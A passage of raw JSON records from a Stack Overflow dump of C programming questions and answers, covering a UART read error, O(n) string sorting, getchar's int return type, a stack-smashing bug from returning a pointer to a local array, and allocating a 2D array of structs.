&amp;response[spot1], \"%c\", buf );\nspot1 += n;\n} while( buf != '\\r' &amp;&amp; n &gt; 0);\n\nif (n &lt; 0) {\nprintf(\"Error reading %d %s\",errno, strerror(errno));\n}\nelse if (n==0) {\nprintf(\"read nothing\");\n}\nelse {\nprintf(\"Response %s\",response);\n}\n}\n</code></pre>\n\n<p>This reading from Uart gives error from errno and it is error number 11 which says that Resource is temporary unavailable</p>\n\n<p>I am getting this output</p>\n\n<pre><code>Error reading 11 Resource temporarily unavailable\n</code></pre>\n\n<p>I am using USB to UART converter. Hope someone could help. Thanks :)</p>\n"}, {"tags": ["c", "arrays", "string", "algorithm", "sorting"], "comments": [{"owner": {"reputation": 381813, "user_id": 1863229, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/4sh1l.png?s=128&g=1", "display_name": "Tim Biegeleisen", "link": "https://stackoverflow.com/users/1863229/tim-biegeleisen"}, "edited": false, "score": 0, "creation_date": 1444806703, "post_id": 33118781, "comment_id": 54050970, "body": "The fastest you can sort an array of strings of size <code>N</code> is roughly <code>O(N*lgN)</code>, which you get from doing merge sort or quick sort."}, {"owner": {"reputation": 50117, "user_id": 243943, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/1c2c4840dd73dbea59932f83d4640c56?s=128&d=identicon&r=PG", "display_name": "npinti", "link": "https://stackoverflow.com/users/243943/npinti"}, "edited": false, "score": 0, "creation_date": 1444806703, "post_id": 33118781, "comment_id": 54050971, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/2352313/is-there-an-on-integer-sorting-algorithm\">this</a>."}, {"owner": {"reputation": 22874, "user_id": 3282056, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/IXonK.jpg?s=128&g=1", "display_name": "rcgldr", "link": "https://stackoverflow.com/users/3282056/rcgldr"}, "edited": false, "score": 0, "creation_date": 1444807510, "post_id": 33118781, "comment_id": 54051435, "body": "As linked to by npinti, a least significant to most significant character counting / radix sort would take (maximum length of a string) passes, moving m strings on each pass. If the maximum length of a string is considered to be a constant, such as n or some other constant, then the time complexity could be considered to be O(m) (not O(n)). If m is considered to be the constant, and n is variable, then the time complexity could be considered to be O(n)."}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1444809992, "post_id": 33118781, "comment_id": 54052942, "body": "<a href=\"https://en.m.wikipedia.org/wiki/Trie\" rel=\"nofollow noreferrer\">en.m.wikipedia.org/wiki/Trie</a>"}, {"owner": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "reply_to_user": {"reputation": 381813, "user_id": 1863229, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/4sh1l.png?s=128&g=1", "display_name": "Tim Biegeleisen", "link": "https://stackoverflow.com/users/1863229/tim-biegeleisen"}, "edited": false, "score": 0, "creation_date": 1444810512, "post_id": 33118781, "comment_id": 54053244, "body": "@TimBiegeleisen This isn&#39;t really just basic string sort. This is having n total characters, which are divided into m substrings. And then the m substrings need to be sorted in O(n), with m &lt;= n, obviously."}, {"owner": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "edited": false, "score": 1, "creation_date": 1444811909, "post_id": 33118781, "comment_id": 54054000, "body": "To OP: you should perhaps show a bit more effort than writing &quot;here&#39;s my assignment copy-pasted, help me!&quot;. Like, explain what you don&#39;t understand about it, or tell it in your own words (which amounts to rubber duck problem solving, so it&#39;s actually useful in itself!)."}, {"owner": {"reputation": 14956, "user_id": 544557, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ad1df76ef4fab96ec67b2afa080b3a0c?s=128&d=identicon&r=PG", "display_name": "Jim Balter", "link": "https://stackoverflow.com/users/544557/jim-balter"}, "reply_to_user": {"reputation": 381813, "user_id": 1863229, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/4sh1l.png?s=128&g=1", "display_name": "Tim Biegeleisen", "link": "https://stackoverflow.com/users/1863229/tim-biegeleisen"}, "edited": false, "score": 0, "creation_date": 1444830601, "post_id": 33118781, "comment_id": 54066525, "body": "@TimBiegeleisen &quot;The fastest you can sort an array of strings of size N&quot; -- that&#39;s not relevant. <code>n</code> in the problem statement is a very different number from your N."}], "answers": [{"tags": [], "owner": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "is_accepted": true, "score": 3, "last_activity_date": 1444809082, "last_edit_date": 1444809082, "creation_date": 1444808428, "answer_id": 33119423, "question_id": 33118781, "link": "https://stackoverflow.com/questions/33118781/algorithm-on-sorting-array-of-pointers-to-strings-in-on/33119423#33119423", "title": "algorithm on sorting array of pointers to strings in O(n)", "body": "<p>Since this is an assignment I won't provide a complete answer, merely some ideas on how to proceed.</p>\n\n<p>Since the strings can be any length you need to use an O(n) sorting algorithm.</p>\n\n<p>One such algorithm is bucket sort.</p>\n\n<p>So how do we arrange the buckets for variable length strings?</p>\n\n<p>Create 256 buckets for the first character.\nLet each bucket have a counter + a set of 256 buckets for the second character and so on. </p>\n\n<p>Important note: Don't create any bucket set until you need to or the memory consumption will be infinite. Let an empty bucket set be <code>NULL</code></p>\n\n<p>When we have the bucket system set up. How do we sort a word into the bucket system?</p>\n\n<p>Let's say we have the word <code>Yes</code>.</p>\n\n<p>First character is <code>Y</code> so we go to the top level bucket set. The set is <code>NULL</code> so we create the top level and select bucket <code>'Y'</code>. </p>\n\n<p>Next character is <code>e</code>. The bucket set under <code>Y</code> is <code>NULL</code> so we create the set and select bucket <code>'e'</code>. </p>\n\n<p>Next character is <code>s</code>. The bucket set under <code>Ye</code> is <code>NULL</code> so we create the set and select bucket <code>'s'</code>. </p>\n\n<p>The string ends. Increase the count for the current bucket  <code>Y-&gt;e-&gt;s</code>.</p>\n\n<p>Note that the task will be simpler if you use <code>unsigned char</code>, because then you can use the value directly as an index into an array of length <code>256</code>.</p>\n\n<p>The <code>bucket</code> struct could look like this:</p>\n\n<pre><code>typedef struct bucket {\n    int count;\n    struct bucket *next;  // points to NULL or array of 256 buckets.\n} bucket;\n</code></pre>\n\n<p><strong>Time Complexity:</strong></p>\n\n<p>The maximum amount of work for each character is:</p>\n\n<p>end of string check + NULL check + ((allocation and initialization of array of 256 buckets (I would use <code>calloc</code> for this) or (increase one bucket count)) + increase loop variable.</p>\n\n<p><strong>Memory Usage</strong></p>\n\n<p>Here comes the disadvantage of bucket sort. It uses a lot of memory if you need many buckets, and this solution will use quite a number.</p>\n"}, {"tags": [], "owner": {"reputation": 1859, "user_id": 2157639, "user_type": "registered", "accept_rate": 23, "profile_image": "https://www.gravatar.com/avatar/faaf63a16923788f63d2a2b68c8d3c6b?s=128&d=identicon&r=PG", "display_name": "Ivan  Ivanov", "link": "https://stackoverflow.com/users/2157639/ivan-ivanov"}, "is_accepted": false, "score": 0, "last_activity_date": 1444809191, "creation_date": 1444809191, "answer_id": 33119664, "question_id": 33118781, "link": "https://stackoverflow.com/questions/33118781/algorithm-on-sorting-array-of-pointers-to-strings-in-on/33119664#33119664", "title": "algorithm on sorting array of pointers to strings in O(n)", "body": "<p>You may think about String as about number in 255 basis. So, if distribution is uniform, then bucket sort would give linear time; also radix sort is linear, but you need some preparations before sort (to transform String into number).</p>\n"}], "owner": {"reputation": 353, "user_id": 4847214, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/03941dd267a2f227b0ccaa5a6ba791be?s=128&d=identicon&r=PG&f=1", "display_name": "Suhaib Ahmad", "link": "https://stackoverflow.com/users/4847214/suhaib-ahmad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1083, "favorite_count": 0, "accepted_answer_id": 33119423, "answer_count": 2, "score": -2, "last_activity_date": 1444809347, "creation_date": 1444806465, "question_id": 33118781, "link": "https://stackoverflow.com/questions/33118781/algorithm-on-sorting-array-of-pointers-to-strings-in-on", "title": "algorithm on sorting array of pointers to strings in O(n)", "body": "<p>This is my algorithms assignment, and I do not know how to proceed. </p>\n\n<p>Given an array A of m strings, where different strings may have different numbers of\ncharacters, but the total number of characters over all the strings in the array is n. Show\nhow to sort the strings in O(n) time. Note that the desired order here is the standard\nalphabetical order; for example, a &lt; ab &lt; b.\nMore technically speaking, A is an array of pointers each pointing to a string (which is\nanother array of characters); you can think about how strings are used in C. Also, we\nassume that each character can be viewed as an integer ranging from 0 to 255.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 1, "creation_date": 1444806521, "post_id": 33118645, "comment_id": 54050869, "body": "You should RTFM <a href=\"http://man7.org/linux/man-pages/man3/getchar.3.html\" rel=\"nofollow noreferrer\">getchar(3)</a> which tells you that <code>getchar</code> returns an <code>int</code>."}], "answers": [{"comments": [{"owner": {"reputation": 4426, "user_id": 450609, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6708bd9ccabfcb1cf6863fb32f32d1de?s=128&d=identicon&r=PG", "display_name": "dave", "link": "https://stackoverflow.com/users/450609/dave"}, "edited": false, "score": 0, "creation_date": 1444806291, "post_id": 33118699, "comment_id": 54050756, "body": "Some people might like to know <i>why</i> <code>getchar</code> is defined to return an <code>int</code>.  Especially since I quickly looked for duplicates and couldn&#39;t find a simple &quot;What does <code>getchar</code> return?&quot; question."}, {"owner": {"reputation": 8978, "user_id": 2223579, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/wQuP6.jpg?s=128&g=1", "display_name": "BlackMamba", "link": "https://stackoverflow.com/users/2223579/blackmamba"}, "edited": false, "score": 0, "creation_date": 1444806323, "post_id": 33118699, "comment_id": 54050766, "body": "because <code>getchar</code> just read a char and return it, why use <code>int</code> , not use <code>char</code>?"}, {"owner": {"reputation": 4426, "user_id": 450609, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6708bd9ccabfcb1cf6863fb32f32d1de?s=128&d=identicon&r=PG", "display_name": "dave", "link": "https://stackoverflow.com/users/450609/dave"}, "edited": false, "score": 0, "creation_date": 1444806441, "post_id": 33118699, "comment_id": 54050830, "body": "because <code>EOF</code> is not a <code>char</code> but an <code>int</code>.  So that <code>getchar</code> can either return a negative number (&quot;I couldn&#39;t get a char!&quot;) or the next character on standard input."}, {"owner": {"reputation": 22956, "user_id": 1132937, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5H4Gk.png?s=128&g=1", "display_name": "Mithrandir", "link": "https://stackoverflow.com/users/1132937/mithrandir"}, "reply_to_user": {"reputation": 8978, "user_id": 2223579, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/wQuP6.jpg?s=128&g=1", "display_name": "BlackMamba", "link": "https://stackoverflow.com/users/2223579/blackmamba"}, "edited": false, "score": 1, "creation_date": 1444806635, "post_id": 33118699, "comment_id": 54050938, "body": "@BlackMamba: see edit"}], "tags": [], "owner": {"reputation": 22956, "user_id": 1132937, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5H4Gk.png?s=128&g=1", "display_name": "Mithrandir", "link": "https://stackoverflow.com/users/1132937/mithrandir"}, "is_accepted": false, "score": 5, "last_activity_date": 1444806611, "last_edit_date": 1444806611, "creation_date": 1444806185, "answer_id": 33118699, "question_id": 33118645, "link": "https://stackoverflow.com/questions/33118645/how-to-define-the-return-type-of-getchar/33118699#33118699", "title": "How to define the return type of `getchar()`?", "body": "<p>Because <code>getchar()</code> is defined as:</p>\n\n<pre><code> int getchar(void);\n</code></pre>\n\n<p>That should be reason enough. The reason is explained very well <a href=\"http://c-faq.com/stdio/getcharc.html\" rel=\"nofollow\">here</a>:</p>\n\n<p>Two types of error/failure are possible if getchar's return value is assigned to a char.</p>\n\n<blockquote>\n  <p>If type char is signed, and if EOF is defined (as is usual) as -1, the\n  character with the decimal value 255 ('\\377' or '\\xff' in C) will be\n  sign-extended and will compare equal to EOF, prematurely terminating\n  the input. </p>\n  \n  <p>If type char is unsigned, an actual EOF value will be truncated (by\n  having its higher-order bits discarded, probably resulting in 255 or\n  0xff) and will not be recognized as EOF, resulting in effectively\n  infinite input.</p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 101058, "user_id": 318758, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9870a37447a4ae811096e8e7d10ed3f9?s=128&d=identicon&r=PG", "display_name": "Joni", "link": "https://stackoverflow.com/users/318758/joni"}, "is_accepted": false, "score": 1, "last_activity_date": 1444806405, "creation_date": 1444806405, "answer_id": 33118765, "question_id": 33118645, "link": "https://stackoverflow.com/questions/33118645/how-to-define-the-return-type-of-getchar/33118765#33118765", "title": "How to define the return type of `getchar()`?", "body": "<p><code>getchar</code> returns <code>EOF</code> to indicate end of file or error, otherwise it returns an <code>unsigned char</code> cast to <code>int</code>. If you use <code>char</code> to store the return value you cannot tell the difference between <code>EOF</code> and some characters. </p>\n"}], "owner": {"reputation": 8978, "user_id": 2223579, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/wQuP6.jpg?s=128&g=1", "display_name": "BlackMamba", "link": "https://stackoverflow.com/users/2223579/blackmamba"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 740, "favorite_count": 0, "closed_date": 1444806440, "answer_count": 2, "score": -3, "last_activity_date": 1444806611, "creation_date": 1444806046, "question_id": 33118645, "link": "https://stackoverflow.com/questions/33118645/how-to-define-the-return-type-of-getchar", "closed_reason": "Duplicate", "title": "How to define the return type of `getchar()`?", "body": "<p>Here is the code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main()\n{\n    char c;\n    while((c = getchar()) != EOF) \n    {\n        putchar(c);\n    }\n    return 0;\n}\n</code></pre>\n\n<p>But some body says that i should change <code>char c</code> to <code>int c</code>.</p>\n\n<p>Who can tell me the reason?</p>\n"}, {"tags": ["c", "dynamic-memory-allocation"], "comments": [{"owner": {"reputation": 54864, "user_id": 404970, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/o6X94.jpg?s=128&g=1", "display_name": "molbdnilo", "link": "https://stackoverflow.com/users/404970/molbdnilo"}, "edited": false, "score": 0, "creation_date": 1444808213, "post_id": 33118615, "comment_id": 54051907, "body": "You&#39;re assuming that lines are no longer than 100 characters and that a comment doesn&#39;t span several lines. The line by line storage is an unnecessary complication, and you don&#39;t even need to read the entire file and store it just to strip comments."}, {"owner": {"reputation": 61, "user_id": 2239374, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/5ef6a41b3297586aba77f41c275947ee?s=128&d=identicon&r=PG", "display_name": "hockeyfreak863", "link": "https://stackoverflow.com/users/2239374/hockeyfreak863"}, "reply_to_user": {"reputation": 54864, "user_id": 404970, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/o6X94.jpg?s=128&g=1", "display_name": "molbdnilo", "link": "https://stackoverflow.com/users/404970/molbdnilo"}, "edited": false, "score": 0, "creation_date": 1444808641, "post_id": 33118615, "comment_id": 54052176, "body": "i found the error to be inside of the strip_comments function, i changed the data structure from dynamic to static and got the same result, then started commenting out methods, found out that it was in the strip_comments area... will post my solution when i fix it for future info"}, {"owner": {"reputation": 61, "user_id": 2239374, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/5ef6a41b3297586aba77f41c275947ee?s=128&d=identicon&r=PG", "display_name": "hockeyfreak863", "link": "https://stackoverflow.com/users/2239374/hockeyfreak863"}, "reply_to_user": {"reputation": 54864, "user_id": 404970, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/o6X94.jpg?s=128&g=1", "display_name": "molbdnilo", "link": "https://stackoverflow.com/users/404970/molbdnilo"}, "edited": false, "score": 0, "creation_date": 1444808781, "post_id": 33118615, "comment_id": 54052267, "body": "the fix was to change                                                                              const char *strip_comments(char input[MAX_LINE_WIDTH])     to                         const char *strip_comments(char input[500]){"}, {"owner": {"reputation": 54864, "user_id": 404970, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/o6X94.jpg?s=128&g=1", "display_name": "molbdnilo", "link": "https://stackoverflow.com/users/404970/molbdnilo"}, "edited": false, "score": 0, "creation_date": 1444808991, "post_id": 33118615, "comment_id": 54052389, "body": "Those two prototypes are equivalent - the parameter is actually a pointer, and the number inside <code>[]</code> is ignored by the compiler. You must have changed something else as well."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1444810812, "post_id": 33118615, "comment_id": 54053406, "body": "<code>input</code> seems like a horrible typedef name, since you have several variables named input as well. Maybe change this to <code>input_t</code>."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1444811078, "post_id": 33118615, "comment_id": 54053511, "body": "@hockeyfreak863 You haven&#39;t fixed anything with that, you still have a major bug. You merely dodged the bug by luck the one time you re-built and executed the program. See my posted answer for an actual solution."}], "answers": [{"tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": true, "score": 1, "last_activity_date": 1444810963, "last_edit_date": 1495542215, "creation_date": 1444810963, "answer_id": 33120187, "question_id": 33118615, "link": "https://stackoverflow.com/questions/33118615/stack-smashing-detected-on-eustis/33120187#33120187", "title": "Stack smashing detected, on Eustis", "body": "<p>You are returning a pointer to the local variable <code>char output[100];</code>, which invokes undefined behavior. Returning a pointer to a local variable is always a severe bug. </p>\n\n<p>Instead, pass the <code>output</code> buffer as a parameter to the function and leave the allocation to the caller.</p>\n\n<p><a href=\"https://stackoverflow.com/questions/6441218/can-a-local-variables-memory-be-accessed-outside-its-scope\">Can a local variable be accessed outside its scope?</a></p>\n"}], "owner": {"reputation": 61, "user_id": 2239374, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/5ef6a41b3297586aba77f41c275947ee?s=128&d=identicon&r=PG", "display_name": "hockeyfreak863", "link": "https://stackoverflow.com/users/2239374/hockeyfreak863"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 100, "favorite_count": 0, "accepted_answer_id": 33120187, "answer_count": 1, "score": 0, "last_activity_date": 1444810963, "creation_date": 1444805917, "last_edit_date": 1444810667, "question_id": 33118615, "link": "https://stackoverflow.com/questions/33118615/stack-smashing-detected-on-eustis", "title": "Stack smashing detected, on Eustis", "body": "<p>When I compile and run this program on Windows/Eustis I am not getting any errors or warnings.</p>\n\n<p>The basic function of the program is to read in an input text file(source code) and strip out C-style comments <code>/*........*/</code> to a file <code>cleaninput.txt</code>.</p>\n\n<p>It works on Windows. However, when run on Eusis I get this:</p>\n\n<pre><code>gcc -o out.x a2.c\n./out.x \n*** stack smashing detected ***: ./out.x terminated\nAborted\n</code></pre>\n\n<p>I have tried compiling with the command </p>\n\n<pre><code>gcc -fno-stack-protector -o out.x a2.c\n./out.x\n*** Error in './out.x': double free or corruption (out): 0x09670440 ***\nAborted\n</code></pre>\n\n<p>Is there a program or utility I can use to figure this out?</p>\n\n<pre><code>#include&lt;stdlib.h&gt;\n#include&lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n\n#define MAX_DEC_LENGHT 11\n#define MAX_INTEGER 99999\n#define MAX_LINE_WIDTH 100      //used in the struct below defines how wide a instruction can be per line\n\nFILE *fp;\n\n\ntypedef struct input{\n    char line[MAX_LINE_WIDTH];\n    struct input *next;\n}input;\n\nvoid scanFile();\nstruct input *Push(struct input *temp2, char Buff[MAX_LINE_WIDTH]);\nvoid printClean(struct input *temp);\nint Get_No_Lines();\nvoid freeme(struct input* ptr);\nconst char  *strip_comments(char input[MAX_LINE_WIDTH]);\n\n\n\n\nint main(){\n    int x = Get_No_Lines();\n    scanFile(x);        //will read in the input and produce cleaninput.txt, get_no_lines is used to tell the program later how long the input text file is\n    return(0);\n}\n\n\n\n\n/*\nTake in an integer N, which represents how many lines there are in the text file, which is used in scanning into a linked list of each line\ncalls for the print clean input function\nCurrently not returning anything\n*/\nvoid scanFile(int n){   \n    fp = fopen(\"input.txt\", \"r\");\n    struct input*temp = NULL;\n\n    int i;\n\n    for(i=0;i&lt;n;i++){\n        char Buff[MAX_LINE_WIDTH];\n        fgets(Buff,MAX_LINE_WIDTH,fp);          //fgets is by far the easiest solution i found to scanning in line by line, the linked list is there for unlimited input lenght\n        temp = Push(temp,Buff);     //push the value of fgets onto the linked list\n    }\n    printClean(temp);\n    freeme(temp);               //at this point we call the printClean input function\n    fclose(fp); \n}\n\n/*\nTake in the the pointer to a linked list, and place the value buff into the structs line segment,\nBasic function is linked list push to end\n*/\nstruct input *Push(struct input *temp2, char Buff[MAX_LINE_WIDTH]){\n    struct input *temp=(struct input*)malloc(sizeof(struct input));\n    struct input *current = temp2;\n    strcpy(temp-&gt;line,Buff);\n    temp-&gt;next= NULL;\n        if(temp2==NULL){\n            return(temp);       //base case if null\n        }\n\n        while(current-&gt;next!=NULL){\n            current = current-&gt;next;        //insert to back of list\n        }   \n    current-&gt;next = temp;           //link the new node\n    return(temp2);                  \n}\n\n/*\nThe main driver function for stripping the comments out of the input text file, \ncalls the strip_comments function and places the result back into the struct, then prints to the file stream\ncurrently not returing anythig, shouldnt need to, will be checked later -MM \n*/\nvoid printClean(struct input *temp){\n    fp = fopen(\"cleaninput.txt\", \"w\");\n    while(temp!=NULL){\n        char t[MAX_LINE_WIDTH];\n        strcpy(t,strip_comments(temp-&gt;line));                   //copy the contents of strip_comments into t, and then copy the contents of t into temp-&gt;line\n        strcpy(temp-&gt;line, t);                                  //yeah im not sure why i need to strcpy's but it wouldnt work without them \\_(?)_/\u00af\n        fputs(temp-&gt;line, fp);\n        temp=temp-&gt;next;        \n    }\n    fclose(fp);\n}\n\n\nconst char *strip_comments(char input[MAX_LINE_WIDTH]){ \n    char output[100];\n\n    int i=0;\n    int x =0;\n\n    int inComment = 0;  // a boolean variable to let the case statment change behavior in the while loop\n\n    while(i&lt;=MAX_LINE_WIDTH){\n        if(inComment==1){\n            if(input[i]=='*' &amp;&amp; input[i+1]=='/'){\n                inComment=0;\n                i++;                                    //end the comment, and increment the counter up two to clear hte comment \n                i++;\n            }\n        }   \n        if(inComment==0){\n            if(input[i]=='/'&amp;&amp; input[i+1]=='*'){            //condtion to enter the comment switch\n                inComment=1;                                            \n        }else{              \n            output[x] = input[i];           //if not in the comment and last check was not in comment push the value of input[i] to output[x] increment x\n            x++;\n        }\n    }\n\n        i++;\n    }\n    char *rtn = output;\n    return(rtn);            //return the input free of comments, currently cannot handle multi_line comments\n}\n\n\n/*\nUsed for the scanning function, its sole purpose is to let the program know how many lines there are in the input text file\n*/\nint Get_No_Lines(){\n    fp = fopen(\"input.txt\", \"r\");\n\n    int ch, number_of_lines = 0;\n        do \n        {\n            ch = fgetc(fp);\n            if(ch == '\\n')\n                number_of_lines++;          //if the scanner gets to a \\n charecter increment\n        } while (ch != EOF);\n\n        if(ch != '\\n' &amp;&amp; number_of_lines != 0)          // needs to be checked, method was adopted from the internet \n            number_of_lines++;  \n\n    if(number_of_lines==0){     //i added this case in when we get a one line input that the user has not hit the /n or enter key\n        number_of_lines =1; \n    }    \n\n    fclose(fp);\n    return(number_of_lines);\n}\n\nvoid freeme(struct input* ptr){\n    struct input *temp;\n    while(ptr!=NULL){\n        temp=ptr-&gt;next;\n        strcpy(ptr-&gt;line,\"\");\n        free(ptr);\n        ptr=temp;\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "struct", "malloc"], "comments": [{"owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 0, "creation_date": 1444805318, "post_id": 33118356, "comment_id": 54050233, "body": "First you have to decide, C or C++. Answer will be different. Then, this is not 2D but only an emulation of it. Don&#39;t do that, neither in C nor C++. In C you can just do <code>a (*b)[dim2] = malloc(sizeof(a[dim1][dim2]));</code> and you have it in one go."}, {"owner": {"reputation": 1462, "user_id": 1264703, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/5b414ac947d0748072e685dd864ff003?s=128&d=identicon&r=PG", "display_name": "Maxsteel", "link": "https://stackoverflow.com/users/1264703/maxsteel"}, "reply_to_user": {"reputation": 13900, "user_id": 2020827, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/e6c7105ef9148e931ad05a6692155046?s=128&d=identicon&r=PG&f=1", "display_name": "sergej", "link": "https://stackoverflow.com/users/2020827/sergej"}, "edited": false, "score": 0, "creation_date": 1444805555, "post_id": 33118356, "comment_id": 54050356, "body": "@sergej e and j are the dimensions. Vertical and Horizontal. I&#39;ll edit my question."}, {"owner": {"reputation": 1858, "user_id": 4799193, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a87fb12a6ad909323fb42a48e78b3f28?s=128&d=identicon&r=PG&f=1", "display_name": "ramana_k", "link": "https://stackoverflow.com/users/4799193/ramana-k"}, "edited": false, "score": 0, "creation_date": 1444805697, "post_id": 33118356, "comment_id": 54050419, "body": "You can initialize v to zero by replacing malloc with calloc."}, {"owner": {"reputation": 25589, "user_id": 15727, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FFivc.jpg?s=128&g=1", "display_name": "Thomas Padron-McCarthy", "link": "https://stackoverflow.com/users/15727/thomas-padron-mccarthy"}, "edited": false, "score": 0, "creation_date": 1444807622, "post_id": 33118356, "comment_id": 54051505, "body": "Will the array be used locally in a function? If so, you can just write <code>cb arr[s][e];</code> to create it. (It should be reasonably small too, to fit on the stack.)"}], "answers": [{"comments": [{"owner": {"reputation": 1462, "user_id": 1264703, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/5b414ac947d0748072e685dd864ff003?s=128&d=identicon&r=PG", "display_name": "Maxsteel", "link": "https://stackoverflow.com/users/1264703/maxsteel"}, "edited": false, "score": 0, "creation_date": 1444805871, "post_id": 33118531, "comment_id": 54050519, "body": "Can you please clarify a bit more on this?"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 1462, "user_id": 1264703, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/5b414ac947d0748072e685dd864ff003?s=128&d=identicon&r=PG", "display_name": "Maxsteel", "link": "https://stackoverflow.com/users/1264703/maxsteel"}, "edited": false, "score": 1, "creation_date": 1444806029, "post_id": 33118531, "comment_id": 54050611, "body": "@Maxsteel <code>arr</code> is a pointer to a &quot;cb array&quot; of size <code>y</code>. You set it to point to the first element of a 2D &quot;cb array&quot; of size <code>x</code> times <code>y</code>. Since the rules of pointer arithmetic apply to array pointers just as any other pointer, <code>arr[i]</code> will give you array number <code>i</code>, just as <code>int* ptr; ptr[i]</code> will give you <code>int</code> number <code>i</code>. And since <code>arr[i]</code> is an array, <code>arr[i][j]</code> is an item of that array."}], "tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 2, "last_activity_date": 1444805873, "last_edit_date": 1444805873, "creation_date": 1444805696, "answer_id": 33118531, "question_id": 33118356, "link": "https://stackoverflow.com/questions/33118356/initialize-a-member-of-two-dimensional-dynamic-struct/33118531#33118531", "title": "Initialize a member of two dimensional dynamic struct", "body": "<p>Never use pointer-to-pointer lookup tables for the purpose of dynamically allocating 2D arrays. It is widespread but bad and incorrect practice, leading to segmentation and slow programs.</p>\n\n<p>Instead, use an array pointer and allocate a true 2D array in adjacent memory:</p>\n\n<pre><code>cb (*arr)[y] = malloc( sizeof(cb[x][y]) );\n\narr[i][j] = something;\n\nfree(arr);\n</code></pre>\n\n<p>To initialize everything to zero, use calloc instead of malloc. To initialize everything to a given value, you have to use a loop and 